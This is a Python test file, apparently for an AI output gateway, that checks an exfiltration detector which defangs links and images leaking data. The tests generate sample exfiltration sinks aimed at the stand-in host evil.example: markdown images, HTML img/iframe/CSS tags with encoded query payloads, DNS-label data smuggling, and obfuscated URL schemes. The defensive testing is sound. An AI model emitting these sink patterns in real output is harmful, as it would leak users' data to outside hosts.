# ruff: noqa: E501  (GW33 test file: long assertion/docstring lines kept readable)
"""GW33 task 7.3 / Property 7: exfiltration channel detection and defang completeness."""
from __future__ import annotations

import base64
import random
import re
import time

from gateway_v2.detect.deterministic.canonicalize import DEFAULT_BUDGET, canonicalize
from gateway_v2.detect.output.exfil import ExfilDetector
from gateway_v2.domain import Category, FindingStatus
from gateway_v2.runtime.resources_output import DEFAULT_OUTPUT_BOUNDS, OutputBounds

_ITERATIONS = 1_500
_ALLOW = frozenset({"cdn.example.com"})
_HEX = "0123456789abcdef"


def _detector(allow: frozenset[str] = _ALLOW, cap: int | None = None) -> ExfilDetector:
    bounds = DEFAULT_OUTPUT_BOUNDS
    if cap is not None:
        bounds = OutputBounds(
            bounds.exfil_min_payload_chars, bounds.exfil_min_encoded_run,
            bounds.exfil_min_label_chars, bounds.exfil_max_host_chars, cap,
            bounds.decode_expansion_bound, bounds.canary_token_chars,
        )
    return ExfilDetector(bounds=bounds, allow_hosts=allow)


def _defang(text: str, detector: ExfilDetector) -> tuple[str, int]:
    findings = [f for f in detector.detect(text) if f.status is FindingStatus.EXECUTED]
    spans = sorted(
        {(s.start, s.end) for f in findings for s in f.spans}, key=lambda p: (p[0], p[1]),
    )
    merged: list[list[int]] = []
    for start, end in spans:
        if merged and start < merged[-1][1]:
            merged[-1][1] = max(merged[-1][1], end)
        else:
            merged.append([start, end])
    out, cursor = [], 0
    for start, end in merged:
        out.append(text[cursor:start])
        out.append("[defanged]")
        cursor = end
    out.append(text[cursor:])
    return "".join(out), len(findings)


def _remote_url_left(text: str) -> bool:
    canonical, _ = canonicalize(text, DEFAULT_BUDGET, decode_base64=False)
    return re.search(r"(?:https?|ftp|wss?)://|(?<![:\w/])//[a-z0-9]", canonical, re.I) is not None


def _payload(rng: random.Random, style: str) -> str:
    raw = bytes(rng.choice(b"abcdefghijklmnopqrstuvwxyz0123456789 =;") for _ in range(40))
    if style == "base64":
        return base64.b64encode(raw).decode().rstrip("=")
    if style == "urlsafe":
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")
    if style == "hex":
        return raw.hex()
    if style == "plain":
        return "".join(rng.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(60))
    return "".join(f"%{b:02x}" for b in raw[:12])


def _sink(rng: random.Random, style: str, host: str) -> str:
    data = _payload(rng, style)
    url = f"https://{host}/p?d={data}"
    return rng.choice([
        f"![x]({url})",
        f'<img src="{url}">',
        f"<img src='{url}' alt=a>",
        f'<iframe src="{url}"></iframe>',
        f'<div style="background:url({url})">',
        f'<link rel="stylesheet" href="{url}">',
        f"![a][r]\n\n[r]: {url}",
        f'<svg><image href="{url}"/></svg>',
    ])


def test_property_7_every_payload_sink_is_fully_defanged() -> None:
    """Feature: gw33-output-parity, Property 7: Exfil defang completeness. Validates 2.2-2.8."""
    # Feature: gw33-output-parity, Property 7: Exfil defang completeness
    rng = random.Random(33_007)
    detector = _detector()
    for _ in range(_ITERATIONS):
        style = rng.choice(["base64", "urlsafe", "hex", "plain", "percent"])
        host = rng.choice(["evil.example", "x.test", "cdn.example.com"])
        text = f"before {_sink(rng, style, host)} after"
        defanged, count = _defang(text, detector)
        assert count >= 1, text
        assert not _remote_url_left(defanged), (text, defanged)
        # Nothing flagged any more.
        assert not [f for f in detector.detect(defanged) if f.status is FindingStatus.EXECUTED]


def test_property_7_allow_listed_plain_links_and_logos_are_not_findings() -> None:
    # Feature: gw33-output-parity, Property 7: Exfil defang completeness
    rng = random.Random(33_107)
    detector = _detector()
    for _ in range(_ITERATIONS):
        path = "/".join(rng.choice(["assets", "img", "docs", "v1"]) for _ in range(rng.randint(1, 3)))
        for text in (
            f"![logo](https://cdn.example.com/{path}/logo.png)",
            f'<img src="https://cdn.example.com/{path}/a.gif">',
            f"[docs](https://docs.python.org/3/{path}/x.html)",
            f'<a href="https://example.org/{path}">t</a>',
            "![local](logo.png)",
            "![data](data:image/png;base64,iVBORw0KGgo=)",
        ):
            assert detector.detect(text) == (), text


def test_dns_label_exfiltration_is_independent_of_scheme_and_sink() -> None:
    detector = _detector()
    blob = "4f3c9a8b7d6e5f4a3b2c1d0e9f8a7b6c"
    for text in (
        f"[x](http://{blob}.evil.example/)",
        f"![x](https://{blob}.evil.example/a.png)",
        f"see http://{blob}.evil.example now",
    ):
        assert any(f.status is FindingStatus.EXECUTED for f in detector.detect(text)), text
    assert detector.detect("[x](https://internationalization.example.com/page)") == ()


def test_obfuscated_scheme_and_host_are_caught_at_original_offsets() -> None:
    detector = _detector()
    for text in (
        "![x](h\u200bttps://evil.example/a)",
        "![x](\uff48\uff54\uff54\uff50\uff53://evil.example/a)",
        '<img src="h&#116;tps://evil.example/a">',
    ):
        findings = [f for f in detector.detect(text) if f.status is FindingStatus.EXECUTED]
        assert findings and findings[0].category is Category.EXFIL
        assert findings[0].evidence is None
        span = findings[0].spans[0]
        assert 0 <= span.start < span.end <= len(text)


def test_candidate_cap_yields_one_unavailable_for_the_remainder() -> None:
    detector = _detector(allow=frozenset(), cap=3)
    text = " ".join(f"![i{n}](https://evil.example/{n})" for n in range(10))
    findings = detector.detect(text)
    assert [f.status for f in findings] == [FindingStatus.EXECUTED] * 3 + [FindingStatus.UNAVAILABLE]


def test_decode_budget_miss_and_rule_id() -> None:
    detector = ExfilDetector(rule_id="out_exfil")
    findings = detector.detect("%41" * 6000)
    assert [f.status for f in findings] == [FindingStatus.UNAVAILABLE]
    assert findings[0].detector == "out_exfil" and findings[0].spans == ()


def test_pathological_inputs_finish_within_a_contract_derived_bound() -> None:
    from gateway_v2.runtime.resources import ResourceContract

    contract = ResourceContract(
        cpu_quota=4.0, memory_limit=1 << 34, fd_limit=4096, guard_capacity=None,
        target_p99_ms=20.0, utilization_cap=0.75, per_worker_rss=400 << 20, worker_override=None,
        cpu_source="t", mem_source="t", fd_source="t",
    )
    bound = contract.grounding_wait_budget_s()  # 2 s at the default contract
    detector = _detector(allow=frozenset())
    cases = {
        "many sinks": "![a](https://e.com/x) " * 8000,
        "unclosed images": "![a " * 50000,
        "unclosed links": "[a]( " * 40000,
        "deep percent": "%2525252541" * 20000,
        "long host": "![a](http://" + "a" * 5000 + ".com/x)",
        "long url": "![a](https://e.com/" + "a" * 100000 + ")",
        "angle brackets": "<" * 150000,
    }
    for name, text in cases.items():
        start = time.perf_counter()
        findings = detector.detect(text)
        elapsed = time.perf_counter() - start
        assert elapsed < bound, (name, elapsed)
        assert all(f.status in (FindingStatus.EXECUTED, FindingStatus.UNAVAILABLE) for f in findings)
        assert len(findings) <= contract.output_scan_candidate_cap() + 1, name
